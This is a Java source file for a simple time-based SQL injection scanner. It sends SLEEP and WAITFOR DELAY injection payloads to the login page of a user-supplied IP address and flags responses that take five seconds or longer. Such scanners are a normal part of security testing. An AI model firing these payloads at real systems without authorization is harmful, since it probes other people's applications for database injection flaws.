import java.io.*;
import java.net.*;
import java.util.*;

public class TimeBasedSQLInjectionDetector {

    // Function to detect Time-Based SQL Injection by analyzing response time
    public static void detectTimeBasedSQLInjection(String ipAddress) {
        System.out.println("Checking for potential Time-Based SQL Injection on " + ipAddress + "...");

        // SQL injection payloads commonly used to detect Time-Based SQL Injection
        String[] payloads = {
            "'; SLEEP(5) --",   // Time delay of 5 seconds (MySQL)
            "'; WAITFOR DELAY '00:00:05' --",  // Time delay for SQL Server
            "' OR IF(1=1, SLEEP(5), 0) --",   // Another MySQL time delay
            "' AND IF(1=1, SLEEP(5), 0) --",  // Time delay with AND condition (MySQL)
        };

        // Target URL for testing
        String url = "http://" + ipAddress + "/login"; // Example URL, adjust based on the target app

        for (String payload : payloads) {
            try {
                // Measure the time for each request with the payload
                long startTime = System.currentTimeMillis();
                
                // Send POST request
                String data = "username=" + payload + "&password=password";
                URL obj = new URL(url);
                HttpURLConnection con = (HttpURLConnection) obj.openConnection();
                con.setRequestMethod("POST");
                con.setDoOutput(true);

                // Send the POST data
                try (DataOutputStream wr = new DataOutputStream(con.getOutputStream())) {
                    wr.writeBytes(data);
                    wr.flush();
                }

                // Get the response code to check for the status
                int responseCode = con.getResponseCode();
                long endTime = System.currentTimeMillis();
                
                // Calculate response time
                long responseTime = endTime - startTime;

                // Detect Time-Based SQL Injection by checking for delay
                if (responseTime >= 5000) {  // If the response time is greater than a threshold (e.g., 5 seconds)
                    System.out.println("[!] Time-Based SQL Injection detected with payload: " + payload);
                    System.out.println("Response time: " + responseTime + " milliseconds");
                } else {
                    System.out.println("[+] No time delay detected for payload: " + payload);
                }
                
            } catch (IOException e) {
                System.out.println("[!] Error making request: " + e.getMessage());
            }
        }
    }

    // Main function to start the detection process
    public static void main(String[] args) {
        System.out.println("================== Time-Based SQL Injection Detection Tool ================== ");

        // Prompt the user for an IP address to test for Time-Based SQL Injection
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter the target IP address:");
        String ipAddress = scanner.nextLine();

        // Start detecting Time-Based SQL Injection
        detectTimeBasedSQLInjection(ipAddress);
        
        scanner.close();
    }
}
